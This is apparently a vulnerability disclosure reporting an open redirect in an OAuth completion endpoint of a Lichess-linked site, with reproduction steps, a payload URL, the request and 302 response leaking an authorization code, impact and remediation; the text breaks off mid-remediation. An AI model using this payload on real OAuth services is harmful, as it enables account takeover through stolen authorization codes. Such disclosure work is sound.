## Title
Open Redirect & OAuth Authorization Code Leakage via `redirect_uri` Parameter - Lichess

## Description
**Affected URL:** https://manipulating.pwnedbox.site/oauth/complete?redirect_uri=https%3A%2F%2Fmanipulating.pwnedbox.site%2Fauth%2Flichess%2F&state=f425296aee12

An Open Redirect vulnerability exists in the Lichess OAuth authorization completion endpoint (`/oauth/complete`). The `redirect_uri` GET parameter accepts arbitrary external domains without validating the destination against a registered allow-list. When a user authorizes the application, the server returns an HTTP `302 Found` response redirecting the user to the attacker-supplied `redirect_uri` with the sensitive OAuth `code` and `state` parameters appended in the query string.

## Steps to Reproduce
1. Navigate to the OAuth authorization endpoint (`https://manipulating.pwnedbox.site/oauth/authorize?client_id=lichess4545&redirect_uri=https://manipulating.pwnedbox.site/auth/lichess/&response_type=code&scope=preference:read&state=f425296aee12`) and observe the authorization consent screen.
2. Intercept or construct the OAuth completion request to `/oauth/complete` and modify the `redirect_uri` parameter to an external domain such as `https://bing.com`.
3. Open `https://manipulating.pwnedbox.site/oauth/complete?redirect_uri=https://bing.com&state=f425296aee12` in a browser or send the request through a proxy tool.
4. Observe the server responding with `HTTP/2 302 Found` and `Location: https://bing.com?code=7060aa9266337c01f1fb&state=f425296aee12`, immediately redirecting the browser to `www.bing.com` while exposing the OAuth authorization code in the URL.

## POC (Proof of Concept)
**Payload URL:** `https://manipulating.pwnedbox.site/oauth/complete?redirect_uri=https://bing.com&state=f425296aee12`

**HTTP Request:**
```http
GET /oauth/complete?redirect_uri=[https://bing.com](https://bing.com)&state=f425296aee12 HTTP/2
Host: manipulating.pwnedbox.site
```

**HTTP Response:**
```http
HTTP/2 302 Found
Location: [https://bing.com?code=7060aa9266337c01f1fb&state=f425296aee12](https://bing.com?code=7060aa9266337c01f1fb&state=f425296aee12)
```

**Visual Evidence:**
- OAuth consent prompt on `manipulating.pwnedbox.site` displaying the expected legitimate callback (`https://manipulating.pwnedbox.site/auth/lichess/`).
  <img width="1928" height="962" alt="image" src="https://github.com/user-attachments/assets/4bfc77be-2f8a-4982-95cd-87da58cc7e24" /><br><br>

- Proxy capture confirming the `302 Found` response on `/oauth/complete` with `Location: https://bing.com?code=7060aa9266337c01f1fb&state=f425296aee12`.
  <img width="1562" height="487" alt="image" src="https://github.com/user-attachments/assets/30d66bcd-99ae-4b28-a995-aa8c3d0e476d" /><br><br>

- Browser navigating to `https://manipulating.pwnedbox.site/oauth/complete?redirect_uri=https://bing.com&state=f425296aee12` and landing on `www.bing.com/?code=bdaeb8e9473b744b5648&state=f425296aee12`.<br>
  <img width="1037" height="65" alt="image" src="https://github.com/user-attachments/assets/c65dd5be-7048-4d47-b4fd-6125ab75140c" /><br>
  <img width="1024" height="413" alt="image" src="https://github.com/user-attachments/assets/67c7628b-bca6-44b7-a129-11eaf5738403" />



## Impact
Because this open redirect occurs within an OAuth 2.0 flow and appends the authorization `code` directly to the destination URL, the impact extends beyond standard phishing:
- **Account Takeover via OAuth Code Theft:** An attacker can capture the victim's valid OAuth authorization `code` from their server logs or `Referer` header and exchange it for an access token to compromise the victim's account.
- **Phishing Attacks:** Craft convincing OAuth links using `manipulating.pwnedbox.site` to lure users onto lookalike pages and harvest credentials.
- **Malware Distribution:** Redirect unsuspecting visitors to external sites hosting malicious downloads or browser exploits.
- **Trust & Reputation Damage:** Undermine user confidence in third-party authentication flows from the application.

## Remediation
1. **Strict `redirect_uri` Allow-Listing:** Validate the `redirect_uri` parameter on both `/oauth/authorize` and `/oauth/complete` using exact string matching against pre-registered callback URIs associated with the `client_id` (e.g., `https://manipulating.pwnedbox.site/auth/lichess/`).
2. **Reject Unregistered or Dynamic Destinations:** Never rely on partial host matching, substring checks, or open wildcards in OAuth callback validation; immediately return an HTTP `400 Bad Request` error rather than issuing a `302` redirect if the `redirect_uri` does not match an approved entry.
3. **Bind Authorization Codes to the Original `redirect_uri`:** Ensure the token exchange endpoint verifies that the `redirect_uri` presented when
